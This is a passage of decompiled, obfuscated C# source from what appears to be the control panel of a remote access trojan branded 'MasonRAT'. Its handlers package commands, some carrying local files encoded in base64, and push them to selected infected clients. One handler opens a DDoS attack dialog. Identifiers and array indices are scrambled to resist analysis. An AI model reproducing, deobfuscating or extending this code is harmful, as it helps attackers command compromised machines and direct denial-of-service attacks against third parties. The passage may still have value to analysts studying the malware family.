    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1961) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1962));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u060Dـ\u0608\u060B\u0608\u060Eڞـٺـ\u0609ـڅـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1963) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1964))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـ\u0608ټۨـڙـٸ\u0609ؤ\u060Eڅْٺ\u060Fڙ\u0609(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1965) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1966))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۭۧ\u0609ﻻۡ\u0608دـژ\u0609حټــټ(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ.SelectedIndex = 0;
  }

  private void \u2694️MasonRAT\u270C\u060Aــڅۡ\u0609\u0609\u060Aټڙ(object sender, PaintEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڕبـۛـ\u0609\u060Dּـڟ\u060Aۭۡﻻڙﻋـ\u0020\u060Dـ(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270Cؤـ\u060Aٺ\u060Bْ\u0609ٺـ\u0608ـٺ\u060Fــ.Text = DateTime.Now.ToString(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1967));
    this.\u2694️MasonRAT\u270Cۜ\u060Bــڙ\u060Fڇ\u0609\u060A\u060Eۧ\u060B.Text = this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count.ToString();
    this.\u2694️MasonRAT\u270Cټْ\u0609̍\u060Dــ\u060A\u060Bٺ\u0609.Text = this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.Items.Count.ToString();
    this.\u2694️MasonRAT\u270C\u0020ۡټڙڙ\u060Aـــٻڛۨ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1968) + Conversions.ToString(Settings.\u2694️MasonRAT\u270Cڼ\u060D\u060Fـ̍ڙٺـ\u0609ۏﻋـ\u060Fـ\u060D);
    this.\u2694️MasonRAT\u270Cـۧئ\u0608ڜــڙۚءڙ\u060Fى̍ۡۨژمٺ.Text = DateTime.Now.ToLongTimeString();
    this.\u2694️MasonRAT\u270Cـ\u060Aﻋؤ\u060E\u060Fحٺـۚ\u0609ڦﻼـ.Text = string.Format(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1969), (object) checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cــۧڅﮪ\u060D\u0609ـــ\u0608.NextValue())));
    this.\u2694️MasonRAT\u270Cۨﯧـۚحﮪڟٽـﮪـ\u060A\u0608ـ\u060A\u060Aּ.Text = string.Format(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1970), (object) checked ((int) Math.Round((double) this.\u2694️MasonRAT\u270Cڕـۙۏ\u060Aژـﮪ\u0608ـ\u060Dڛــٻ\u060Cڝـ.NextValue())));
    this.\u2694️MasonRAT\u270Cּ\u0608ـﻋ\u060Dـ\u0609ۏ\u060Cۏحۡۙۙ\u060Aگڜبـڼ.Text = Helper.\u2694️MasonRAT\u270Cــٺــ\u0608ـ\u060Dٺ̍ڙـاۚ\u0609ژڝ(Settings.\u2694️MasonRAT\u270C\u060Cۡدٻ̍ـ\u060Bـڇداڠى\u060Eـگـ\u0608).ToString();
    this.\u2694️MasonRAT\u270Cـ\u060Dۙـۡــ\u060D\u060F\u060C\u0608̍ـڛ.Text = Helper.\u2694️MasonRAT\u270Cــٺــ\u0608ـ\u060Dٺ̍ڙـاۚ\u0609ژڝ(Settings.\u2694️MasonRAT\u270Cۭ̍\u060F\u0609ـــْؤۙڙۧـــ\u060Cۙح).ToString();
  }

  private void \u2694️MasonRAT\u270Cــڙۙۧڜــۙـ\u0609ـ\u060F(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cۨـ\u060F\u060Fژٽ\u0608\u0609ڝؤ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cمـ̍\u060Dـــڼـ\u060A\u060Dۡ\u060B\u0608ىــټ\u0609(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Aڕۏۡ\u0608ـْۙڙ\u060F(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Aڙټٺ\u060Cحـﻋـ\u060Dﻻۧ\u060D(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060D\u0608\u0609\u060Dگم\u060Fـٺۭټٺـ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Fـ\u060Fــ\u060D\u0609ڇٺ\u060Bحﻻ\u060Aــــ\u060A(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060C\u060Aٸاڛــ\u0608\u060D\u0608\u060Dڙ\u060Eۚـ\u060Dۏ\u0608ـ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Bٸۡٻ\u0609ڙﻻگ̍ـ\u0608(object sender, EventArgs e)
  {
    new ChangePort().Show();
  }

  private void \u2694️MasonRAT\u270Cـڙ\u060Dم\u060Cּـ؁ڟ̍\u060Dـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u0608̍ــٽ\u060Bـ\u060A\u0609ح\u060Dۛڠۙڝڟ\u060Eڠ\u060A\u060A(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Dڙٺڙـ\u060Bــڅ\u060A(object sender, EventArgs e)
  {
    new ChangePort().Show();
  }

  private void \u2694️MasonRAT\u270C\u0608ٺ\u0609ــــ̨ڦ\u060D(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cٺڠۙﻼڙـ\u060Bۏڇ\u0609ـٸﻻد\u060Fڞ\u060Bؤ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـــټــ\u060D\u060B\u060D̍\u0609ۚـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـبـ\u060Aـ\u060A\u0608ـؤڟڙ̍\u0608\u060Bْـ\u060Dﻋ̨(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cد\u0608̍ـ\u060Aڙ\u0609ـد\u060Dـﻼح\u0609ـڙـ\u0608\u060F\u0608(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060D\u060Cټ\u0609ٺۡبـ\u060Fءـةـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـڙـ\u060Aـ\u060Dـٺئ\u0609(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڟټּح\u060B\u060Aڙ̍ۙـٸـۨد(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـ\u0609\u060Dڣٺـڙ\u0608\u0609\u060C\u060Aټـ\u0609ــ\u060D(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـدـ\u060Fڙ\u060Aةـ\u0609\u060Bـ\u060Aـــڙب(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cؤـﮪڼـ\u060Cحـ\u0608\u0608ْۧ\u0608ـ\u060A\u060E(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cﻋ\u060Aڠ\u0608\u060Bــۙ\u0609ـح(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڙـــ\u0608ب\u060A\u060Dټٺگ\u0608ۡ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cء\u0608ڛٻ\u0609\u060Aــٺ̍\u0609ٺـؤؤبٽ\u060B\u060B\u0609(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـ\u060D\u060D\u060Aب\u060Eـ\u060Dــ\u060Dم\u0609\u060Aڇـــط(
    object sender,
    MouseEventArgs e)
  {
    if (!this.\u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة.Checked)
      return;
    this.\u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ.Checked = false;
  }

  private void \u2694️MasonRAT\u270Cٺـۙۚۡ\u060E\u0609\u060D\u060Eئـڙ\u0609\u0608\u060D\u060Fماۡ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cـڠـ\u060D\u0608\u0609ڟڟبح\u060D(object sender, MouseEventArgs e)
  {
    if (this.\u2694️MasonRAT\u270C\u0608\u060Cـحڠٺ\u060A\u060Aـٺ\u060Aڙح\u0609ؤ.Checked)
    {
      this.\u2694️MasonRAT\u270Cـ̍ﮪ\u060Cـ\u060B\u0608ــ\u0609\u0609ۙ̍\u060B\u0609\u0609دة.Checked = false;
      this.\u2694️MasonRAT\u270Cد\u060D\u060Dۏــ\u060D؁ﻋ\u060Bدـ\u0609\u0609\u0609\u0608.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1971);
      this.\u2694️MasonRAT\u270Cد\u060D\u060Dۏــ\u060D؁ﻋ\u060Bدـ\u0609\u0609\u0609\u0608.Visible = true;
    }
    else
      this.\u2694️MasonRAT\u270Cد\u060D\u060Dۏــ\u060D؁ﻋ\u060Bدـ\u0609\u0609\u0609\u0608.Visible = false;
  }

  private void \u2694️MasonRAT\u270Cـڣ\u060Dد\u060Fـــ̨ۜ\u060F\u0020\u0609(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڣ\u060Aةﮪةـــ\u060A\u060Aڙ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cﯧد\u060Dـۧء\u0020\u060Aـٺ\u0020ڇؤڙ\u060Aٸ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060Dٸۙ\u060Dـۭد\u0608\u060Fۧ\u0609\u0608\u0609ـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1972));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـﯧټ\u060E\u060D\u060A\u0020ـڙٻ(object sender, CancelEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cح\u060A\u0609ﮪبـۡ\u060B\u0020\u060Aدڞء(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڛﯧ̍\u0609ـ\u060E\u060Cـژ؁ڜٽڙـ\u060Dـﻋةﮪ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    int num = (int) MyProject.\u2694️MasonRAT\u270C\u060Dطڞڛ\u060F\u060Dټـٽټ\u060Bطـﻋۨ\u060Dﻼ.DDos.ShowDialog();
  }

  private void \u2694️MasonRAT\u270Cڙـــ\u0609ــٻـ\u0608\u060Bٸ\u060Dڞـ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cٸـڇۧڇ̍حـٺٽﻋ\u0020̍ـ\u060Fـ\u060D(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    try
    {
      string[] strArray = new string[(1678932876 - 2120252295 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ 1144447602 + -60327762 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << (1050544781 - (1384912429 >> 814077214) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1973);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[1316419194 % 1653354497 - 1293784432 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ((-985983234 ^ -1000179722) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1974)));
      strArray[(433322374 - 1895888609 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ~(1658008287 - 195442050 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((1353049529 > 205872665 ? 590211849 : 786949132) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (1427251221 - 837039376 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % ((-975402151 ^ 565654955 << 962976491) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1)] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1975);
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـټبﻻ\u0020ڕۙ\u060D\u060Eئڟ(object sender, EventArgs e)
  {
  }
}
